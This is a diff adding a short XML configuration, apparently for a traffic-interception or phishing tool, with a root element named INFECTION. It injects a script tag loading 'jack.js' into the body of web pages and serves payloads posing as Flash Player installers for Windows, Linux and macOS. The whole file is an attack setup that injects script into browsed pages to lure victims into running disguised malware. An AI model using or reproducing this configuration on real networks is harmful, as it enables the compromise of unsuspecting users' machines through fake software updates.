@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="utf-8"?>
+ <INFECTION>
+  <INIT>
+   <INJECT>
+    <CODE>
+     <![CDATA[
+     <script language="JavaScript" type="text/javascript" src="jack.js"></script>
+     ]]>
+    </CODE>
+    <HTMLSECTION>body</HTMLSECTION>
+    <POSITION>content</POSITION>
+   </INJECT>
+  </INIT>
+  <RESOURCE>
+   <FILE>jack.js</FILE>
+   <TYPE>js</TYPE>
+  </RESOURCE>
+  <RESOURCE>
+   <FILE>missing.jpg</FILE>
+   <TYPE>jpg</TYPE>
+  </RESOURCE>
+  <PAYLOAD>
+   <FILE>flash-player-installer.exe</FILE>
+   <TYPE>bin</TYPE>
+  </PAYLOAD>
+  <PAYLOAD>
+   <FILE>flash-player-installer.sh</FILE>
+   <TYPE>bin</TYPE>
+  </PAYLOAD>
+  <PAYLOAD>
+   <FILE>flash-player-installer.dmg</FILE>
+   <TYPE>bin</TYPE>
+  </PAYLOAD>
+ </INFECTION>
